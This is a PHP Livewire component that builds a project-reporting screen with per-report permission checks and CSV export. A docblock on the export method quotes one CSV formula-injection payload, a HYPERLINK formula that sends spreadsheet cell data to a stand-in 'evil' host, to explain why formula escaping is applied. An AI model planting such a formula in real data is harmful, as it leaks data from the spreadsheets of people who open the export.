<?php

declare(strict_types=1);

namespace App\Livewire\App\Reports;

use App\Enums\Permission;
use App\Models\Project;
use App\Models\Task;
use App\Models\User;
use App\Models\Workspace;
use App\Services\BudgetService;
use App\Services\DateRange;
use App\Services\ProjectBudget;
use App\Services\ProjectHealthAssessment;
use App\Services\ProjectHealthCalculator;
use App\Services\ProjectProgress;
use App\Services\ProjectProgressCalculator;
use App\Services\TimeReportRow;
use App\Services\TimeReportService;
use App\Services\WorkloadRow;
use App\Services\WorkloadService;
use App\Support\ChartPalette;
use Carbon\CarbonImmutable;
use Illuminate\Contracts\View\View;
use Illuminate\Database\Eloquent\Collection as EloquentCollection;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Gate;
use League\Csv\EscapeFormula;
use League\Csv\Writer;
use Livewire\Attributes\Computed;
use Livewire\Attributes\Layout;
use Livewire\Attributes\Url;
use Livewire\Component;
use Symfony\Component\HttpFoundation\StreamedResponse;

/**
 * The reporting surface: five reports over one date range and one project filter.
 *
 * Every figure on this screen comes from a service that already owns the question —
 * {@see ProjectProgressCalculator}, {@see ProjectHealthCalculator}, {@see WorkloadService},
 * {@see TimeReportService}, {@see BudgetService}. Nothing is recomputed here, because a
 * second implementation of "how complete is this project" is a second answer, and the one
 * on the report is the one people quote in meetings.
 *
 * ## Permissions, per report
 *
 * `reports.view` opens the screen. Two of the five reports need more than that: money needs
 * `budget.view` and everybody's logged time needs `time.view_all`. A report the acting user
 * may not see is not offered as an empty tab — it is absent, and the time report silently
 * narrows to their own hours rather than reporting zero for the team.
 *
 * ## Charts
 *
 * Hand-rolled SVG (`resources/views/components/chart`), so a report prints, themes with the
 * tokens and carries its own `<table class="sr-only">`. Nothing here is image-only.
 */
#[Layout('layouts.app')]
final class Index extends Component
{
    private const TABS = ['progress', 'workload', 'health', 'time', 'budget'];

    /** Projects a portfolio report will chart before the numbers stop being readable. */
    private const MAX_PROJECTS = 40;

    public Workspace $workspace;

    #[Url(except: 'progress')]
    public string $tab = 'progress';

    #[Url(as: 'range', except: 'last_30')]
    public string $preset = 'last_30';

    #[Url(as: 'from', except: '')]
    public string $customFrom = '';

    #[Url(as: 'to', except: '')]
    public string $customTo = '';

    #[Url(as: 'project', except: '')]
    public string $projectFilter = '';

    public function mount(Workspace $workspace): void
    {
        $this->authorize('view', $workspace);
        $this->authorize('reports.view', $workspace);

        $this->workspace = $workspace;

        if (! in_array($this->tab, $this->availableTabKeys(), true)) {
            $this->tab = 'progress';
        }
    }

    /* ------------------------------------------------------------------ *
     * Controls
     * ------------------------------------------------------------------ */

    public function selectTab(string $tab): void
    {
        if (in_array($tab, $this->availableTabKeys(), true)) {
            $this->tab = $tab;
        }
    }

    public function updatedPreset(): void
    {
        $this->flushReports();
    }

    public function updatedCustomFrom(): void
    {
        $this->preset = 'custom';
        $this->flushReports();
    }

    public function updatedCustomTo(): void
    {
        $this->preset = 'custom';
        $this->flushReports();
    }

    public function updatedProjectFilter(): void
    {
        $this->flushReports();
    }

    private function flushReports(): void
    {
        unset(
            $this->range,
            $this->projects,
            $this->progress,
            $this->workload,
            $this->health,
            $this->time,
            $this->budget,
        );
    }

    /* ------------------------------------------------------------------ *
     * Scope
     * ------------------------------------------------------------------ */

    public function timezone(): string
    {
        $timezone = (string) ($this->workspace->timezone ?? '');

        return $timezone === '' ? (string) config('app.timezone', 'UTC') : $timezone;
    }

    /**
     * @return array<string, string>
     */
    public function presets(): array
    {
        return [
            'last_7' => __('Last 7 days'),
            'last_30' => __('Last 30 days'),
            'last_90' => __('Last 90 days'),
            'this_month' => __('This month'),
            'this_quarter' => __('This quarter'),
            'custom' => __('Custom range'),
        ];
    }

    #[Computed]
    public function range(): DateRange
    {
        $timezone = $this->timezone();
        $today = CarbonImmutable::now($timezone)->startOfDay();

        return match ($this->preset) {
            'last_7' => DateRange::lastDays(7, $timezone),
            'last_90' => DateRange::lastDays(90, $timezone),
            'this_month' => DateRange::month($timezone),
            'this_quarter' => new DateRange($today->firstOfQuarter(), $today->lastOfQuarter()),
            'custom' => $this->customRange($today),
            default => DateRange::lastDays(30, $timezone),
        };
    }

    private function customRange(CarbonImmutable $today): DateRange
    {
        $from = $this->parseDate($this->customFrom) ?? $today->subDays(29);
        $to = $this->parseDate($this->customTo) ?? $today;

        // A range typed backwards is a slip, not a request for an error page.
        return $to->lessThan($from)
            ? new DateRange($to, $from)
            : new DateRange($from, $to);
    }

    private function parseDate(string $value): ?CarbonImmutable
    {
        if (preg_match('/^\d{4}-\d{2}-\d{2}$/', $value) !== 1) {
            return null;
        }

        $date = CarbonImmutable::createFromFormat('Y-m-d', $value, $this->timezone());

        return $date === false ? null : $date->startOfDay();
    }

    /**
     * The projects in scope: the filter's one, or every project this person can open.
     *
     * @return EloquentCollection<int, Project>
     */
    #[Computed]
    public function projects(): EloquentCollection
    {
        $query = Project::query()
            ->forWorkspace($this->workspace)
            ->visibleTo($this->actor())
            ->orderBy('name')
            ->limit(self::MAX_PROJECTS + 1);

        if ($this->projectFilter !== '' && ctype_digit($this->projectFilter)) {
            $query->whereKey((int) $this->projectFilter);
        } else {
            $query->active();
        }

        return $query->get();
    }

    /**
     * @return array<string, string>
     */
    #[Computed]
    public function projectOptions(): array
    {
        $options = ['' => __('All active projects')];

        $projects = Project::query()
            ->forWorkspace($this->workspace)
            ->visibleTo($this->actor())
            ->orderBy('name')
            ->limit(200)
            ->get(['id', 'workspace_id', 'name', 'is_archived']);

        foreach ($projects as $project) {
            $options[(string) $project->getKey()] = $project->is_archived
                ? $project->name.' · '.__('Archived')
                : (string) $project->name;
        }

        return $options;
    }

    /**
     * Whether the portfolio is wider than a report can usefully chart.
     *
     * The limit is admitted rather than hidden: a bar chart of sixty projects is a wall of
     * hairlines, and a table that silently stops at forty is a table that lies about the
     * total. The filter above narrows it honestly.
     */
    public function projectsTruncated(): bool
    {
        return $this->projects->count() > self::MAX_PROJECTS;
    }

    public function scopedProject(): ?Project
    {
        return $this->projects->count() === 1 && $this->projectFilter !== ''
            ? $this->projects->first()
            : null;
    }

    /* ------------------------------------------------------------------ *
     * The five reports
     * ------------------------------------------------------------------ */

    /**
     * Delivery: how much of each project is done, and how much of it is late.
     *
     * Two queries for any number of projects — the calculator's aggregate, and one grouped
     * count for the overdue and due-soon columns it does not carry.
     *
     * @return list<array<string, mixed>>
     */
    #[Computed]
    public function progress(): array
    {
        $projects = $this->projects;

        if ($projects->isEmpty()) {
            return [];
        }

        $ids = $projects->map(static fn (Project $project): int => (int) $project->getKey())->all();

        /** @var array<int, ProjectProgress> $progress */
        $progress = app(ProjectProgressCalculator::class)->forProjects($ids);

        $today = CarbonImmutable::now($this->timezone())->toDateString();
        $soon = CarbonImmutable::now($this->timezone())->addDays(7)->toDateString();

        $counts = Task::query()
            ->forWorkspace($this->workspace)
            ->whereIn('tasks.project_id', $ids)
            ->groupBy('tasks.project_id')
            ->selectRaw('tasks.project_id as project_id')
            ->selectRaw(
                'sum(case when tasks.completed_at is null and tasks.due_date is not null'
                .' and tasks.due_date < ? then 1 else 0 end) as overdue_tasks',
                [$today],
            )
            ->selectRaw(
                'sum(case when tasks.completed_at is null and tasks.due_date is not null'
                .' and tasks.due_date >= ? and tasks.due_date < ? then 1 else 0 end) as due_soon_tasks',
                [$today, $soon],
            )
            ->toBase()
            ->get()
            ->keyBy('project_id');

        $rows = [];

        foreach ($projects as $project) {
            $id = (int) $project->getKey();
            $result = $progress[$id] ?? ProjectProgress::empty($id);
            $count = $counts[$id] ?? null;

            $rows[] = [
                'project' => $project,
                'id' => $id,
                'name' => (string) $project->name,
                'key' => (string) $project->key,
                'slug' => (string) $project->slug,
                'total' => $result->total,
                'completed' => $result->completed,
                'open' => $result->open(),
                'overdue' => (int) ($count->overdue_tasks ?? 0),
                'dueSoon' => (int) ($count->due_soon_tasks ?? 0),
                'percentage' => $result->percentage,
                'health' => $project->health,
                'targetDate' => $project->target_date?->format('Y-m-d'),
                'color' => ChartPalette::forKey('project:'.$id),
            ];
        }

        return $rows;
    }

    /**
     * @return list<WorkloadRow>
     */
    #[Computed]
    public function workload(): array
    {
        $project = $this->scopedProject();
        $service = app(WorkloadService::class);
        $asOf = CarbonImmutable::now($this->timezone());

        return $project instanceof Project
            ? $service->forProject($project, null, $asOf)
            : $service->forWorkspace($this->workspace, null, $asOf);
    }

    /**
     * @return array<int, ProjectHealthAssessment>
     */
    #[Computed]
    public function health(): array
    {
        return app(ProjectHealthCalculator::class)->assess(
            $this->projects,
            CarbonImmutable::now($this->timezone()),
        );
    }

    public function canSeeAllTime(): bool
    {
        $project = $this->scopedProject();

        return $project instanceof Project
            ? Gate::allows(Permission::TimeViewAll->value, $project)
            : Gate::allows(Permission::TimeViewAll->value, $this->workspace);
    }

    public function canSeeBudget(): bool
    {
        $project = $this->scopedProject();

        return $project instanceof Project
            ? Gate::allows(Permission::BudgetView->value, $project)
            : Gate::allows(Permission::BudgetView->value, $this->workspace);
    }

    /**
     * @return array{
     *     byDay: list<TimeReportRow>, byProject: list<TimeReportRow>, byUser: list<TimeReportRow>,
     *     total: int, billable: int, own: bool
     * }
     */
    #[Computed]
    public function time(): array
    {
        $service = app(TimeReportService::class);
        $range = $this->range;
        $project = $this->scopedProject();
        $scope = $project instanceof Project ? $project : $this->workspace;

        // Without `time.view_all` the report is still useful — it is just a report about
        // you. Reporting zero for the team would be a lie dressed as a permission check.
        $own = ! $this->canSeeAllTime();
        $user = $own ? $this->actor() : null;

        return [
            'byDay' => $service->byDay($scope, $range, $user),
            'byProject' => $service->byProject($scope, $range, $user),
            'byUser' => $own ? [] : $service->byUser($scope, $range),
            'total' => $service->totalMinutes($scope, $range, $user),
            'billable' => $service->billableMinutes($scope, $range, $user),
            'own' => $own,
        ];
    }

    /**
     * @return array<int, ProjectBudget>
     */
    #[Computed]
    public function budget(): array
    {
        if (! $this->canSeeBudget()) {
            return [];
        }

        return app(BudgetService::class)->forProjects($this->projects, $this->range);
    }

    /* ------------------------------------------------------------------ *
     * Tabs
     * ------------------------------------------------------------------ */

    /**
     * @return list<array{key: string, label: string, icon: string}>
     */
    public function tabs(): array
    {
        $tabs = [
            ['key' => 'progress', 'label' => __('Project progress'), 'icon' => 'icon.chart'],
            ['key' => 'workload', 'label' => __('Team workload'), 'icon' => 'icon.users'],
            ['key' => 'health', 'label' => __('Timeline health'), 'icon' => 'icon.warning'],
            ['key' => 'time', 'label' => __('Time'), 'icon' => 'icon.clock'],
        ];

        if ($this->canSeeBudget()) {
            $tabs[] = ['key' => 'budget', 'label' => __('Budget'), 'icon' => 'icon.document'];
        }

        return $tabs;
    }

    /**
     * @return list<string>
     */
    private function availableTabKeys(): array
    {
        return array_values(array_map(
            static fn (array $tab): string => $tab['key'],
            $this->tabs(),
        ));
    }

    /* ------------------------------------------------------------------ *
     * Export
     * ------------------------------------------------------------------ */

    /**
     * The report on screen, as CSV.
     *
     * The same numbers, the same order, the same permission rules — the export is the table
     * you are looking at, not a second query with different assumptions. Cells are written
     * through league/csv rather than joined by hand: a project called "Acme, Inc." is
     * exactly the value that breaks a hand-rolled exporter.
     *
     * `EscapeFormula` is not optional. A project named `=HYPERLINK("http://evil/?"&A1)` is
     * inert text in Planvio and a running program in the spreadsheet this file is opened
     * in, days later, on a machine Planvio never sees. The formatter prefixes any cell
     * starting `=`, `+`, `-`, `@`, tab or carriage return with an apostrophe, which is the
     * spreadsheet convention for "this is text" and is stripped on display.
     */
    public function export(): StreamedResponse
    {
        $this->authorize('reports.view', $this->workspace);

        [$headers, $rows] = $this->exportRows();

        $csv = Writer::createFromString();
        $csv->addFormatter(new EscapeFormula);
        $csv->insertOne($headers);
        $csv->insertAll($rows);

        $body = $csv->toString();
        $range = $this->range;

        $filename = sprintf(
            'planvio-%s-%s-%s-%s.csv',
            $this->workspace->slug,
            $this->tab,
            $range->fromDate(),
            $range->toDate(),
        );

        return response()->streamDownload(
            static function () use ($body): void {
                echo $body;
            },
            $filename,
            ['Content-Type' => 'text/csv; charset=UTF-8'],
        );
    }

    /**
     * @return array{0: list<string>, 1: list<list<string|int|float>>}
     */
    private function exportRows(): array
    {
        return match ($this->tab) {
            'workload' => [
                [__('Person'), __('Total'), __('Open'), __('Completed'), __('Overdue'), __('Estimate (hours)')],
                array_map(static fn (WorkloadRow $row): array => [
                    $row->userName ?? __('Unassigned'),
                    $row->total,
                    $row->open,
                    $row->completed,
                    $row->overdue,
                    $row->estimateHours(),
                ], $this->workload),
            ],
            'health' => [
                [__('Project'), __('Key'), __('Health'), __('Calculated'), __('Set by hand'), __('Signals')],
                array_map(function (array $row): array {
                    $assessment = $this->health[$row['id']] ?? null;

                    return [
                        $row['name'],
                        $row['key'],
                        $assessment?->health->label() ?? '',
                        $assessment?->computed->label() ?? '',
                        $assessment?->manual ? __('Yes') : __('No'),
                        implode('; ', array_map(
                            fn (string $code): string => $this->healthReasonLabel($code),
                            $assessment?->reasonCodes() ?? [],
                        )),
                    ];
                }, $this->progress),
            ],
            'time' => [
                [__('Date'), __('Hours'), __('Billable hours'), __('Entries')],
                array_map(static fn (TimeReportRow $row): array => [
                    (string) $row->label,
                    $row->hours(),
                    $row->billableHours(),
                    $row->entries,
                ], $this->time['byDay']),
            ],
            'budget' => [
                [__('Project'), __('Currency'), __('Planned'), __('Actual'), __('Variance'), __('Utilisation %'), __('Logged hours')],
                array_values(array_map(function (array $row): array {
                    $budget = $this->budget[$row['id']] ?? null;

                    return [
                        $row['name'],
                        $budget?->currency ?? '',
                        $budget?->planned() ?? '',
                        $budget?->actual() ?? '',
                        $budget?->variance() ?? '',
                        $budget?->utilisation() ?? '',
                        $budget === null ? 0 : round($budget->loggedMinutes / 60, 2),
                    ];
                }, $this->progress)),
            ],
            default => [
                [__('Project'), __('Key'), __('Tasks'), __('Completed'), __('Open'), __('Overdue'), __('Due in 7 days'), __('Progress %'), __('Health'), __('Target date')],
                array_map(static fn (array $row): array => [
                    $row['name'],
                    $row['key'],
                    $row['total'],
                    $row['completed'],
                    $row['open'],
                    $row['overdue'],
                    $row['dueSoon'],
                    $row['percentage'],
                    $row['health']?->label() ?? '',
                    $row['targetDate'] ?? '',
                ], $this->progress),
            ],
        };
    }

    /**
     * The health calculator returns codes, not prose, so the report translates them here —
     * one place, shared by the screen and the export.
     */
    public function healthReasonLabel(string $code): string
    {
        return match ($code) {
            ProjectHealthCalculator::REASON_OVERDUE_TASKS => __('Overdue tasks'),
            ProjectHealthCalculator::REASON_DELAYED_MILESTONES => __('Delayed milestones'),
            ProjectHealthCalculator::REASON_WORKLOAD_CONCENTRATION => __('Work concentrated on one person'),
            ProjectHealthCalculator::REASON_DEADLINE_PROXIMITY => __('Deadline close with work open'),
            ProjectHealthCalculator::REASON_TARGET_DATE_PASSED => __('Target date has passed'),
            ProjectHealthCalculator::REASON_PROJECT_CLOSED => __('Project is closed'),
            default => $code,
        };
    }

    public function hours(int $minutes): string
    {
        if ($minutes <= 0) {
            return '0h';
        }

        $hours = intdiv($minutes, 60);
        $rest = $minutes % 60;

        return $hours === 0
            ? $rest.'m'
            : ($rest === 0 ? $hours.'h' : $hours.'h '.$rest.'m');
    }

    private function actor(): User
    {
        $user = Auth::user();

        abort_if(! $user instanceof User, 403);

        return $user;
    }

    public function render(): View
    {
        return view('livewire.app.reports.index')->title(__('Reports'));
    }
}
